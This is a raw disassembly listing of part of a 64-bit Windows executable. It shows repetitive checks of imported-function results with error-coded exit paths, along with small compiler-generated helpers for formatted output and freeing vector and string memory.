   14000441d:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004422:	33 d2                	xor    %edx,%edx
   140004424:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   14000442a:	ff 15 c8 3d 00 00    	call   *0x3dc8(%rip)        # 0x1400081f8
   140004430:	85 c0                	test   %eax,%eax
   140004432:	0f 85 e4 04 00 00    	jne    0x14000491c
   140004438:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000443b:	66 0f 7f 85 20 01 00 	movdqa %xmm0,0x120(%rbp)
   140004442:	00 
   140004443:	39 b5 b8 00 00 00    	cmp    %esi,0xb8(%rbp)
   140004449:	0f 84 e5 04 00 00    	je     0x140004934
   14000444f:	ff 15 93 3d 00 00    	call   *0x3d93(%rip)        # 0x1400081e8
   140004455:	39 85 b8 00 00 00    	cmp    %eax,0xb8(%rbp)
   14000445b:	0f 84 c7 04 00 00    	je     0x140004928
   140004461:	0f 28 85 b0 00 00 00 	movaps 0xb0(%rbp),%xmm0
   140004468:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000446d:	33 d2                	xor    %edx,%edx
   14000446f:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   140004475:	ff 15 7d 3d 00 00    	call   *0x3d7d(%rip)        # 0x1400081f8
   14000447b:	85 c0                	test   %eax,%eax
   14000447d:	0f 85 99 04 00 00    	jne    0x14000491c
   140004483:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004486:	66 0f 7f 85 b0 00 00 	movdqa %xmm0,0xb0(%rbp)
   14000448d:	00 
   14000448e:	39 b5 a8 00 00 00    	cmp    %esi,0xa8(%rbp)
   140004494:	0f 84 9a 04 00 00    	je     0x140004934
   14000449a:	ff 15 48 3d 00 00    	call   *0x3d48(%rip)        # 0x1400081e8
   1400044a0:	39 85 a8 00 00 00    	cmp    %eax,0xa8(%rbp)
   1400044a6:	0f 84 7c 04 00 00    	je     0x140004928
   1400044ac:	0f 28 85 a0 00 00 00 	movaps 0xa0(%rbp),%xmm0
   1400044b3:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400044b8:	33 d2                	xor    %edx,%edx
   1400044ba:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   1400044c0:	ff 15 32 3d 00 00    	call   *0x3d32(%rip)        # 0x1400081f8
   1400044c6:	85 c0                	test   %eax,%eax
   1400044c8:	0f 85 4e 04 00 00    	jne    0x14000491c
   1400044ce:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400044d1:	66 0f 7f 85 a0 00 00 	movdqa %xmm0,0xa0(%rbp)
   1400044d8:	00 
   1400044d9:	39 75 78             	cmp    %esi,0x78(%rbp)
   1400044dc:	0f 84 52 04 00 00    	je     0x140004934
   1400044e2:	ff 15 00 3d 00 00    	call   *0x3d00(%rip)        # 0x1400081e8
   1400044e8:	39 45 78             	cmp    %eax,0x78(%rbp)
   1400044eb:	0f 84 37 04 00 00    	je     0x140004928
   1400044f1:	0f 28 45 70          	movaps 0x70(%rbp),%xmm0
   1400044f5:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400044fa:	33 d2                	xor    %edx,%edx
   1400044fc:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   140004502:	ff 15 f0 3c 00 00    	call   *0x3cf0(%rip)        # 0x1400081f8
   140004508:	85 c0                	test   %eax,%eax
   14000450a:	0f 85 0c 04 00 00    	jne    0x14000491c
   140004510:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004513:	66 0f 7f 45 70       	movdqa %xmm0,0x70(%rbp)
   140004518:	39 75 68             	cmp    %esi,0x68(%rbp)
   14000451b:	0f 84 13 04 00 00    	je     0x140004934
   140004521:	ff 15 c1 3c 00 00    	call   *0x3cc1(%rip)        # 0x1400081e8
   140004527:	39 45 68             	cmp    %eax,0x68(%rbp)
   14000452a:	0f 84 f8 03 00 00    	je     0x140004928
   140004530:	0f 28 45 60          	movaps 0x60(%rbp),%xmm0
   140004534:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004539:	33 d2                	xor    %edx,%edx
   14000453b:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   140004541:	ff 15 b1 3c 00 00    	call   *0x3cb1(%rip)        # 0x1400081f8
   140004547:	85 c0                	test   %eax,%eax
   140004549:	0f 85 cd 03 00 00    	jne    0x14000491c
   14000454f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004552:	66 0f 7f 45 60       	movdqa %xmm0,0x60(%rbp)
   140004557:	39 75 48             	cmp    %esi,0x48(%rbp)
   14000455a:	0f 84 d4 03 00 00    	je     0x140004934
   140004560:	ff 15 82 3c 00 00    	call   *0x3c82(%rip)        # 0x1400081e8
   140004566:	39 45 48             	cmp    %eax,0x48(%rbp)
   140004569:	0f 84 b9 03 00 00    	je     0x140004928
   14000456f:	0f 28 45 40          	movaps 0x40(%rbp),%xmm0
   140004573:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004578:	33 d2                	xor    %edx,%edx
   14000457a:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   140004580:	ff 15 72 3c 00 00    	call   *0x3c72(%rip)        # 0x1400081f8
   140004586:	85 c0                	test   %eax,%eax
   140004588:	0f 85 8e 03 00 00    	jne    0x14000491c
   14000458e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004591:	66 0f 7f 45 40       	movdqa %xmm0,0x40(%rbp)
   140004596:	39 b5 18 01 00 00    	cmp    %esi,0x118(%rbp)
   14000459c:	0f 84 92 03 00 00    	je     0x140004934
   1400045a2:	ff 15 40 3c 00 00    	call   *0x3c40(%rip)        # 0x1400081e8
   1400045a8:	39 85 18 01 00 00    	cmp    %eax,0x118(%rbp)
   1400045ae:	0f 84 74 03 00 00    	je     0x140004928
   1400045b4:	0f 28 85 10 01 00 00 	movaps 0x110(%rbp),%xmm0
   1400045bb:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400045c0:	33 d2                	xor    %edx,%edx
   1400045c2:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   1400045c8:	ff 15 2a 3c 00 00    	call   *0x3c2a(%rip)        # 0x1400081f8
   1400045ce:	85 c0                	test   %eax,%eax
   1400045d0:	0f 85 46 03 00 00    	jne    0x14000491c
   1400045d6:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400045d9:	66 0f 7f 85 10 01 00 	movdqa %xmm0,0x110(%rbp)
   1400045e0:	00 
   1400045e1:	39 b5 08 01 00 00    	cmp    %esi,0x108(%rbp)
   1400045e7:	0f 84 47 03 00 00    	je     0x140004934
   1400045ed:	ff 15 f5 3b 00 00    	call   *0x3bf5(%rip)        # 0x1400081e8
   1400045f3:	39 85 08 01 00 00    	cmp    %eax,0x108(%rbp)
   1400045f9:	0f 84 29 03 00 00    	je     0x140004928
   1400045ff:	0f 28 85 00 01 00 00 	movaps 0x100(%rbp),%xmm0
   140004606:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000460b:	33 d2                	xor    %edx,%edx
   14000460d:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   140004613:	ff 15 df 3b 00 00    	call   *0x3bdf(%rip)        # 0x1400081f8
   140004619:	85 c0                	test   %eax,%eax
   14000461b:	0f 85 fb 02 00 00    	jne    0x14000491c
   140004621:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004624:	66 0f 7f 85 00 01 00 	movdqa %xmm0,0x100(%rbp)
   14000462b:	00 
   14000462c:	39 b5 f8 00 00 00    	cmp    %esi,0xf8(%rbp)
   140004632:	0f 84 fc 02 00 00    	je     0x140004934
   140004638:	ff 15 aa 3b 00 00    	call   *0x3baa(%rip)        # 0x1400081e8
   14000463e:	39 85 f8 00 00 00    	cmp    %eax,0xf8(%rbp)
   140004644:	0f 84 de 02 00 00    	je     0x140004928
   14000464a:	0f 28 85 f0 00 00 00 	movaps 0xf0(%rbp),%xmm0
   140004651:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004656:	33 d2                	xor    %edx,%edx
   140004658:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   14000465e:	ff 15 94 3b 00 00    	call   *0x3b94(%rip)        # 0x1400081f8
   140004664:	85 c0                	test   %eax,%eax
   140004666:	0f 85 b0 02 00 00    	jne    0x14000491c
   14000466c:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000466f:	66 0f 7f 85 f0 00 00 	movdqa %xmm0,0xf0(%rbp)
   140004676:	00 
   140004677:	39 b5 e8 00 00 00    	cmp    %esi,0xe8(%rbp)
   14000467d:	0f 84 b1 02 00 00    	je     0x140004934
   140004683:	ff 15 5f 3b 00 00    	call   *0x3b5f(%rip)        # 0x1400081e8
   140004689:	39 85 e8 00 00 00    	cmp    %eax,0xe8(%rbp)
   14000468f:	0f 84 93 02 00 00    	je     0x140004928
   140004695:	0f 28 85 e0 00 00 00 	movaps 0xe0(%rbp),%xmm0
   14000469c:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400046a1:	33 d2                	xor    %edx,%edx
   1400046a3:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   1400046a9:	ff 15 49 3b 00 00    	call   *0x3b49(%rip)        # 0x1400081f8
   1400046af:	85 c0                	test   %eax,%eax
   1400046b1:	0f 85 65 02 00 00    	jne    0x14000491c
   1400046b7:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400046ba:	66 0f 7f 85 e0 00 00 	movdqa %xmm0,0xe0(%rbp)
   1400046c1:	00 
   1400046c2:	39 b5 d8 00 00 00    	cmp    %esi,0xd8(%rbp)
   1400046c8:	0f 84 66 02 00 00    	je     0x140004934
   1400046ce:	ff 15 14 3b 00 00    	call   *0x3b14(%rip)        # 0x1400081e8
   1400046d4:	39 85 d8 00 00 00    	cmp    %eax,0xd8(%rbp)
   1400046da:	0f 84 48 02 00 00    	je     0x140004928
   1400046e0:	0f 28 85 d0 00 00 00 	movaps 0xd0(%rbp),%xmm0
   1400046e7:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400046ec:	33 d2                	xor    %edx,%edx
   1400046ee:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   1400046f4:	ff 15 fe 3a 00 00    	call   *0x3afe(%rip)        # 0x1400081f8
   1400046fa:	85 c0                	test   %eax,%eax
   1400046fc:	0f 85 1a 02 00 00    	jne    0x14000491c
   140004702:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004705:	66 0f 7f 85 d0 00 00 	movdqa %xmm0,0xd0(%rbp)
   14000470c:	00 
   14000470d:	39 b5 c8 00 00 00    	cmp    %esi,0xc8(%rbp)
   140004713:	0f 84 1b 02 00 00    	je     0x140004934
   140004719:	ff 15 c9 3a 00 00    	call   *0x3ac9(%rip)        # 0x1400081e8
   14000471f:	39 85 c8 00 00 00    	cmp    %eax,0xc8(%rbp)
   140004725:	0f 84 fd 01 00 00    	je     0x140004928
   14000472b:	0f 28 85 c0 00 00 00 	movaps 0xc0(%rbp),%xmm0
   140004732:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004737:	33 d2                	xor    %edx,%edx
   140004739:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   14000473f:	ff 15 b3 3a 00 00    	call   *0x3ab3(%rip)        # 0x1400081f8
   140004745:	85 c0                	test   %eax,%eax
   140004747:	0f 85 cf 01 00 00    	jne    0x14000491c
   14000474d:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004750:	66 0f 7f 85 c0 00 00 	movdqa %xmm0,0xc0(%rbp)
   140004757:	00 
   140004758:	39 b5 98 00 00 00    	cmp    %esi,0x98(%rbp)
   14000475e:	0f 84 d0 01 00 00    	je     0x140004934
   140004764:	ff 15 7e 3a 00 00    	call   *0x3a7e(%rip)        # 0x1400081e8
   14000476a:	39 85 98 00 00 00    	cmp    %eax,0x98(%rbp)
   140004770:	0f 84 b2 01 00 00    	je     0x140004928
   140004776:	0f 28 85 90 00 00 00 	movaps 0x90(%rbp),%xmm0
   14000477d:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004782:	33 d2                	xor    %edx,%edx
   140004784:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   14000478a:	ff 15 68 3a 00 00    	call   *0x3a68(%rip)        # 0x1400081f8
   140004790:	85 c0                	test   %eax,%eax
   140004792:	0f 85 84 01 00 00    	jne    0x14000491c
   140004798:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000479b:	66 0f 7f 85 90 00 00 	movdqa %xmm0,0x90(%rbp)
   1400047a2:	00 
   1400047a3:	39 b5 88 00 00 00    	cmp    %esi,0x88(%rbp)
   1400047a9:	0f 84 85 01 00 00    	je     0x140004934
   1400047af:	ff 15 33 3a 00 00    	call   *0x3a33(%rip)        # 0x1400081e8
   1400047b5:	39 85 88 00 00 00    	cmp    %eax,0x88(%rbp)
   1400047bb:	0f 84 67 01 00 00    	je     0x140004928
   1400047c1:	0f 28 85 80 00 00 00 	movaps 0x80(%rbp),%xmm0
   1400047c8:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400047cd:	33 d2                	xor    %edx,%edx
   1400047cf:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   1400047d5:	ff 15 1d 3a 00 00    	call   *0x3a1d(%rip)        # 0x1400081f8
   1400047db:	85 c0                	test   %eax,%eax
   1400047dd:	0f 85 39 01 00 00    	jne    0x14000491c
   1400047e3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400047e6:	66 0f 7f 85 80 00 00 	movdqa %xmm0,0x80(%rbp)
   1400047ed:	00 
   1400047ee:	39 75 58             	cmp    %esi,0x58(%rbp)
   1400047f1:	0f 84 3d 01 00 00    	je     0x140004934
   1400047f7:	ff 15 eb 39 00 00    	call   *0x39eb(%rip)        # 0x1400081e8
   1400047fd:	39 45 58             	cmp    %eax,0x58(%rbp)
   140004800:	0f 84 22 01 00 00    	je     0x140004928
   140004806:	0f 28 45 50          	movaps 0x50(%rbp),%xmm0
   14000480a:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000480f:	33 d2                	xor    %edx,%edx
   140004811:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   140004817:	ff 15 db 39 00 00    	call   *0x39db(%rip)        # 0x1400081f8
   14000481d:	85 c0                	test   %eax,%eax
   14000481f:	0f 85 f7 00 00 00    	jne    0x14000491c
   140004825:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004828:	ba 01 00 00 00       	mov    $0x1,%edx
   14000482d:	48 8b cf             	mov    %rdi,%rcx
   140004830:	66 0f 7f 45 50       	movdqa %xmm0,0x50(%rbp)
   140004835:	ff 15 5d 3b 00 00    	call   *0x3b5d(%rip)        # 0x140008398
   14000483b:	39 75 48             	cmp    %esi,0x48(%rbp)
   14000483e:	0f 85 d1 00 00 00    	jne    0x140004915
   140004844:	39 75 58             	cmp    %esi,0x58(%rbp)
   140004847:	0f 85 c8 00 00 00    	jne    0x140004915
   14000484d:	39 75 68             	cmp    %esi,0x68(%rbp)
   140004850:	0f 85 bf 00 00 00    	jne    0x140004915
   140004856:	39 75 78             	cmp    %esi,0x78(%rbp)
   140004859:	0f 85 b6 00 00 00    	jne    0x140004915
   14000485f:	39 b5 88 00 00 00    	cmp    %esi,0x88(%rbp)
   140004865:	0f 85 aa 00 00 00    	jne    0x140004915
   14000486b:	39 b5 98 00 00 00    	cmp    %esi,0x98(%rbp)
   140004871:	0f 85 9e 00 00 00    	jne    0x140004915
   140004877:	39 b5 a8 00 00 00    	cmp    %esi,0xa8(%rbp)
   14000487d:	0f 85 92 00 00 00    	jne    0x140004915
   140004883:	39 b5 b8 00 00 00    	cmp    %esi,0xb8(%rbp)
   140004889:	0f 85 86 00 00 00    	jne    0x140004915
   14000488f:	39 b5 c8 00 00 00    	cmp    %esi,0xc8(%rbp)
   140004895:	75 7e                	jne    0x140004915
   140004897:	39 b5 d8 00 00 00    	cmp    %esi,0xd8(%rbp)
   14000489d:	75 76                	jne    0x140004915
   14000489f:	39 b5 e8 00 00 00    	cmp    %esi,0xe8(%rbp)
   1400048a5:	75 6e                	jne    0x140004915
   1400048a7:	39 b5 f8 00 00 00    	cmp    %esi,0xf8(%rbp)
   1400048ad:	75 66                	jne    0x140004915
   1400048af:	39 b5 08 01 00 00    	cmp    %esi,0x108(%rbp)
   1400048b5:	75 5e                	jne    0x140004915
   1400048b7:	39 b5 18 01 00 00    	cmp    %esi,0x118(%rbp)
   1400048bd:	75 56                	jne    0x140004915
   1400048bf:	39 b5 28 01 00 00    	cmp    %esi,0x128(%rbp)
   1400048c5:	75 4e                	jne    0x140004915
   1400048c7:	39 b5 38 01 00 00    	cmp    %esi,0x138(%rbp)
   1400048cd:	75 46                	jne    0x140004915
   1400048cf:	39 b5 48 01 00 00    	cmp    %esi,0x148(%rbp)
   1400048d5:	75 3e                	jne    0x140004915
   1400048d7:	39 b5 58 01 00 00    	cmp    %esi,0x158(%rbp)
   1400048dd:	75 36                	jne    0x140004915
   1400048df:	39 b5 68 01 00 00    	cmp    %esi,0x168(%rbp)
   1400048e5:	75 2e                	jne    0x140004915
   1400048e7:	33 c0                	xor    %eax,%eax
   1400048e9:	48 8b 8d f0 09 00 00 	mov    0x9f0(%rbp),%rcx
   1400048f0:	48 33 cc             	xor    %rsp,%rcx
   1400048f3:	e8 48 1f 00 00       	call   0x140006840
   1400048f8:	4c 8d 9c 24 00 0b 00 	lea    0xb00(%rsp),%r11
   1400048ff:	00 
   140004900:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   140004904:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140004908:	49 8b 7b 38          	mov    0x38(%r11),%rdi
   14000490c:	49 8b e3             	mov    %r11,%rsp
   14000490f:	41 5f                	pop    %r15
   140004911:	41 5e                	pop    %r14
   140004913:	5d                   	pop    %rbp
   140004914:	c3                   	ret
   140004915:	ff 15 d5 3b 00 00    	call   *0x3bd5(%rip)        # 0x1400084f0
   14000491b:	cc                   	int3
   14000491c:	b9 02 00 00 00       	mov    $0x2,%ecx
   140004921:	ff 15 81 38 00 00    	call   *0x3881(%rip)        # 0x1400081a8
   140004927:	cc                   	int3
   140004928:	b9 05 00 00 00       	mov    $0x5,%ecx
   14000492d:	ff 15 75 38 00 00    	call   *0x3875(%rip)        # 0x1400081a8
   140004933:	cc                   	int3
   140004934:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004939:	ff 15 69 38 00 00    	call   *0x3869(%rip)        # 0x1400081a8
   14000493f:	cc                   	int3
   140004940:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004945:	89 75 48             	mov    %esi,0x48(%rbp)
   140004948:	ff 15 5a 38 00 00    	call   *0x385a(%rip)        # 0x1400081a8
   14000494e:	cc                   	int3
   14000494f:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004954:	89 75 58             	mov    %esi,0x58(%rbp)
   140004957:	ff 15 4b 38 00 00    	call   *0x384b(%rip)        # 0x1400081a8
   14000495d:	cc                   	int3
   14000495e:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004963:	89 75 68             	mov    %esi,0x68(%rbp)
   140004966:	ff 15 3c 38 00 00    	call   *0x383c(%rip)        # 0x1400081a8
   14000496c:	cc                   	int3
   14000496d:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004972:	89 75 78             	mov    %esi,0x78(%rbp)
   140004975:	ff 15 2d 38 00 00    	call   *0x382d(%rip)        # 0x1400081a8
   14000497b:	cc                   	int3
   14000497c:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004981:	89 b5 88 00 00 00    	mov    %esi,0x88(%rbp)
   140004987:	ff 15 1b 38 00 00    	call   *0x381b(%rip)        # 0x1400081a8
   14000498d:	cc                   	int3
   14000498e:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004993:	89 b5 98 00 00 00    	mov    %esi,0x98(%rbp)
   140004999:	ff 15 09 38 00 00    	call   *0x3809(%rip)        # 0x1400081a8
   14000499f:	cc                   	int3
   1400049a0:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400049a5:	89 b5 a8 00 00 00    	mov    %esi,0xa8(%rbp)
   1400049ab:	ff 15 f7 37 00 00    	call   *0x37f7(%rip)        # 0x1400081a8
   1400049b1:	cc                   	int3
   1400049b2:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400049b7:	89 b5 b8 00 00 00    	mov    %esi,0xb8(%rbp)
   1400049bd:	ff 15 e5 37 00 00    	call   *0x37e5(%rip)        # 0x1400081a8
   1400049c3:	cc                   	int3
   1400049c4:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400049c9:	89 b5 c8 00 00 00    	mov    %esi,0xc8(%rbp)
   1400049cf:	ff 15 d3 37 00 00    	call   *0x37d3(%rip)        # 0x1400081a8
   1400049d5:	cc                   	int3
   1400049d6:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400049db:	89 b5 d8 00 00 00    	mov    %esi,0xd8(%rbp)
   1400049e1:	ff 15 c1 37 00 00    	call   *0x37c1(%rip)        # 0x1400081a8
   1400049e7:	cc                   	int3
   1400049e8:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400049ed:	89 b5 e8 00 00 00    	mov    %esi,0xe8(%rbp)
   1400049f3:	ff 15 af 37 00 00    	call   *0x37af(%rip)        # 0x1400081a8
   1400049f9:	cc                   	int3
   1400049fa:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400049ff:	89 b5 f8 00 00 00    	mov    %esi,0xf8(%rbp)
   140004a05:	ff 15 9d 37 00 00    	call   *0x379d(%rip)        # 0x1400081a8
   140004a0b:	cc                   	int3
   140004a0c:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004a11:	89 b5 08 01 00 00    	mov    %esi,0x108(%rbp)
   140004a17:	ff 15 8b 37 00 00    	call   *0x378b(%rip)        # 0x1400081a8
   140004a1d:	cc                   	int3
   140004a1e:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004a23:	89 b5 18 01 00 00    	mov    %esi,0x118(%rbp)
   140004a29:	ff 15 79 37 00 00    	call   *0x3779(%rip)        # 0x1400081a8
   140004a2f:	cc                   	int3
   140004a30:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004a35:	89 b5 28 01 00 00    	mov    %esi,0x128(%rbp)
   140004a3b:	ff 15 67 37 00 00    	call   *0x3767(%rip)        # 0x1400081a8
   140004a41:	cc                   	int3
   140004a42:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004a47:	89 b5 38 01 00 00    	mov    %esi,0x138(%rbp)
   140004a4d:	ff 15 55 37 00 00    	call   *0x3755(%rip)        # 0x1400081a8
   140004a53:	cc                   	int3
   140004a54:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004a59:	89 b5 48 01 00 00    	mov    %esi,0x148(%rbp)
   140004a5f:	ff 15 43 37 00 00    	call   *0x3743(%rip)        # 0x1400081a8
   140004a65:	cc                   	int3
   140004a66:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004a6b:	89 b5 58 01 00 00    	mov    %esi,0x158(%rbp)
   140004a71:	ff 15 31 37 00 00    	call   *0x3731(%rip)        # 0x1400081a8
   140004a77:	cc                   	int3
   140004a78:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004a7d:	89 b5 68 01 00 00    	mov    %esi,0x168(%rbp)
   140004a83:	ff 15 1f 37 00 00    	call   *0x371f(%rip)        # 0x1400081a8
   140004a89:	cc                   	int3
   140004a8a:	cc                   	int3
   140004a8b:	cc                   	int3
   140004a8c:	cc                   	int3
   140004a8d:	cc                   	int3
   140004a8e:	cc                   	int3
   140004a8f:	cc                   	int3
   140004a90:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140004a95:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140004a9a:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004a9f:	53                   	push   %rbx
   140004aa0:	56                   	push   %rsi
   140004aa1:	57                   	push   %rdi
   140004aa2:	48 83 ec 30          	sub    $0x30,%rsp
   140004aa6:	48 8b fa             	mov    %rdx,%rdi
   140004aa9:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
   140004aae:	48 8b d9             	mov    %rcx,%rbx
   140004ab1:	e8 5a c5 ff ff       	call   0x140001010
   140004ab6:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140004abb:	4c 8b cf             	mov    %rdi,%r9
   140004abe:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140004ac4:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004acb:	00 00 
   140004acd:	48 8b d3             	mov    %rbx,%rdx
   140004ad0:	48 8b 08             	mov    (%rax),%rcx
   140004ad3:	ff 15 87 3a 00 00    	call   *0x3a87(%rip)        # 0x140008560
   140004ad9:	85 c0                	test   %eax,%eax
   140004adb:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140004ae0:	0f 48 c1             	cmovs  %ecx,%eax
   140004ae3:	48 83 c4 30          	add    $0x30,%rsp
   140004ae7:	5f                   	pop    %rdi
   140004ae8:	5e                   	pop    %rsi
   140004ae9:	5b                   	pop    %rbx
   140004aea:	c3                   	ret
   140004aeb:	cc                   	int3
   140004aec:	cc                   	int3
   140004aed:	cc                   	int3
   140004aee:	cc                   	int3
   140004aef:	cc                   	int3
   140004af0:	40 53                	rex push %rbx
   140004af2:	48 83 ec 30          	sub    $0x30,%rsp
   140004af6:	48 8b d9             	mov    %rcx,%rbx
   140004af9:	48 8b 09             	mov    (%rcx),%rcx
   140004afc:	48 85 c9             	test   %rcx,%rcx
   140004aff:	74 3a                	je     0x140004b3b
   140004b01:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   140004b05:	48 2b d1             	sub    %rcx,%rdx
   140004b08:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004b0f:	72 18                	jb     0x140004b29
   140004b11:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140004b15:	48 83 c2 27          	add    $0x27,%rdx
   140004b19:	48 2b c8             	sub    %rax,%rcx
   140004b1c:	48 83 e9 08          	sub    $0x8,%rcx
   140004b20:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140004b24:	77 1b                	ja     0x140004b41
   140004b26:	48 8b c8             	mov    %rax,%rcx
   140004b29:	e8 32 1d 00 00       	call   0x140006860
   140004b2e:	33 c0                	xor    %eax,%eax
   140004b30:	48 89 03             	mov    %rax,(%rbx)
   140004b33:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140004b37:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140004b3b:	48 83 c4 30          	add    $0x30,%rsp
   140004b3f:	5b                   	pop    %rbx
   140004b40:	c3                   	ret
   140004b41:	33 c0                	xor    %eax,%eax
   140004b43:	45 33 c9             	xor    %r9d,%r9d
   140004b46:	45 33 c0             	xor    %r8d,%r8d
   140004b49:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004b4e:	33 d2                	xor    %edx,%edx
   140004b50:	33 c9                	xor    %ecx,%ecx
   140004b52:	ff 15 b0 39 00 00    	call   *0x39b0(%rip)        # 0x140008508
   140004b58:	cc                   	int3
   140004b59:	cc                   	int3
   140004b5a:	cc                   	int3
   140004b5b:	cc                   	int3
   140004b5c:	cc                   	int3
   140004b5d:	cc                   	int3
   140004b5e:	cc                   	int3
   140004b5f:	cc                   	int3
   140004b60:	40 53                	rex push %rbx
   140004b62:	48 83 ec 30          	sub    $0x30,%rsp
   140004b66:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   140004b6a:	48 8b d9             	mov    %rcx,%rbx
   140004b6d:	48 83 fa 07          	cmp    $0x7,%rdx
   140004b71:	76 31                	jbe    0x140004ba4
   140004b73:	48 8b 09             	mov    (%rcx),%rcx
   140004b76:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140004b7d:	00 
   140004b7e:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004b85:	72 18                	jb     0x140004b9f
   140004b87:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140004b8b:	48 83 c2 27          	add    $0x27,%rdx
   140004b8f:	48 2b c8             	sub    %rax,%rcx
   140004b92:	48 83 e9 08          	sub    $0x8,%rcx
   140004b96:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140004b9a:	77 1f                	ja     0x140004bbb
   140004b9c:	48 8b c8             	mov    %rax,%rcx
   140004b9f:	e8 bc 1c 00 00       	call   0x140006860
   140004ba4:	33 c0                	xor    %eax,%eax
   140004ba6:	48 c7 43 18 07 00 00 	movq   $0x7,0x18(%rbx)
   140004bad:	00 
   140004bae:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140004bb2:	66 89 03             	mov    %ax,(%rbx)
   140004bb5:	48 83 c4 30          	add    $0x30,%rsp
   140004bb9:	5b                   	pop    %rbx
   140004bba:	c3                   	ret
   140004bbb:	33 c0                	xor    %eax,%eax
   140004bbd:	45 33 c9             	xor    %r9d,%r9d
   140004bc0:	45 33 c0             	xor    %r8d,%r8d
   140004bc3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004bc8:	33 d2                	xor    %edx,%edx
   140004bca:	33 c9                	xor    %ecx,%ecx
   140004bcc:	ff 15 36 39 00 00    	call   *0x3936(%rip)        # 0x140008508
   140004bd2:	cc                   	int3
   140004bd3:	cc                   	int3
   140004bd4:	cc                   	int3
   140004bd5:	cc                   	int3
   140004bd6:	cc                   	int3
   140004bd7:	cc                   	int3
   140004bd8:	cc                   	int3
   140004bd9:	cc                   	int3
   140004bda:	cc                   	int3
